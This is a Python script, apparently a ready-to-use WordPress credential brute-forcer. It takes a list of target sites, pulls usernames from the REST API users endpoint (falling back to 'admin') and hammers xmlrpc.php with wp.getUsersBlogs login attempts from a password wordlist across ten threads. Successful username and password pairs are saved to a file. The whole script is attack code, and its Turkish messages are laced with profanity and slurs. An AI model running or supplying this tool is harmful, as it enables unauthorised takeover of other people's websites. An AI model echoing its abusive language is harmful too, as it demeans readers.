import requests,argparse,sys,json,time
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

def fetching_user(url):
	print(colored("[{}][*] Amina kodugumun sitesinde kullanici adi var mi onu ariyorum. {}".format(local_time(),url), "blue"))
	user_list = []
	try:
		req = requests.get(url+"/wp-json/wp/v2/users/", allow_redirects=False, timeout=5).content.decode('utf-8')
		try:
			print(colored("[{}][!] Buldum orospu cocugunun kullanici adini! {}".format(local_time(),url), "green"))
			for x in json.loads(req):
				user_list.append(x['slug'])
		except ValueError:
			print(colored("[{}][!] Json {} siktigimini cozemedim. !\n".format(local_time(),url), "red"))
		
	except Exception as e:
		print(colored("[{}][!] Hata olustu yine amina koydugumun yerinde! !".format(local_time()), "red"))

	return user_list
def check_array(arr): 
    if len(arr) == 0: 
        return 0
    else: 
        return 1

def local_time():
	t = time.localtime()
	current_time = time.strftime("%H:%M:%S", t)
	return current_time
def save(format):
	s = open("sikilenler-listesi.txt", "a+")
	s.write(format+"\n")

def exploit(url, user_url, list_password):
	try:
		payloads = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>""".format(user_url, list_password)

		headers = {'Content-Type':'text/xml'}
		r = requests.post('{}/xmlrpc.php'.format(url), headers=headers,data=payloads, timeout=15)
		if "isAdmin" in str(r.content):
			print(colored("[{}][+] Anasi sikilecek kullanici adi [{}] ve sifre [{}] websitesine ait. {} ".format(local_time(),user_url,list_password,url), "green"))
			save("Orospu cocugunun kullanici adi [{}] ve sifresi [{}] siteye giris yapiyor. {}".format(user_url,list_password,url))
		else:
			print(colored("[{}][-] Siktigimin kulaanici adi bu {} ama bu sikik {} sifreyle giris yapmiyor. {}".format(local_time(),url,user_url, list_password), "red"))
	except requests.exceptions.ConnectionError as e:
		print(colored("[{}][!] Siktigimin yerinde siteye baglanilmiyor ki. :(".format(local_time()), "red"))
	except Exception as e:
			print(colored("[{}][!] Anasinin Ami! Bi yerde takiliyor! Orospu cocuklari napmislarsa... :(".format(local_time()), "red"))

def brute_url(url):
	try:
		username_url = fetching_user(url)
		user = []
		if check_array(username_url):
			for username in username_url:
				user.append(username)
		else:
			print(colored('[{}][+] amina kodugumun kullanici adini bulamadim. mecbur bunu sikmeye calisacaz [admin]'.format(local_time()), "green"))
			user.append("admin")

		password = "sikiskensifre.txt"

		with ThreadPoolExecutor(max_workers=10) as executor:
			for user_url in user:
				with open(password, "r") as password_list:
					for list_password in password_list:
						executor.submit(exploit,url,user_url,list_password)


			user.clear()
	except requests.exceptions.ConnectionError as e:
		print(colored("[{}][!] ConnectionError :(".format(local_time()), "red"))
	except Exception as e:
		print(colored("[{}][!] Something Wrong :(".format(local_time()), "red"))

def main():
 	try:
 		parser = argparse.ArgumentParser(description='Fucker Bull BF [Wordpress]')
 		parser.add_argument("--list", help="Sikilmeye aday web sitelerini girin.", required=True)
 		args = parser.parse_args()
 		try:
 			with open(args.list, "r") as victim:
 				print(colored("[+] Sikis basladi on {}".format(local_time()), "yellow"))
 				for sites in victim:
 					url = sites.rstrip()
 					brute_url(url)
 				print(colored("[+] Sikis bitti on {}".format(local_time()), "yellow"))
 		except IOError as e:
 			print("[{}][!] Sikilmeye aday web sitesi yok aq. Abaza kalacaz. !".format(local_time()))
 			sys.exit()
 	except KeyboardInterrupt as e:
 		print("[{}][!] Siktigimin sitesinden cikiyorum. Alsin gotune soksun.".format(local_time()))
 		sys.exit()

if __name__ == "__main__":
	banner = """
                 Fucker Bull BF  [Wordpress]      
                       iyi sikisler!!                 
 Saka la saka! 31 e devam. Sen nerden kari dusurup sikecen mal!       
"""
	print(banner)
	main()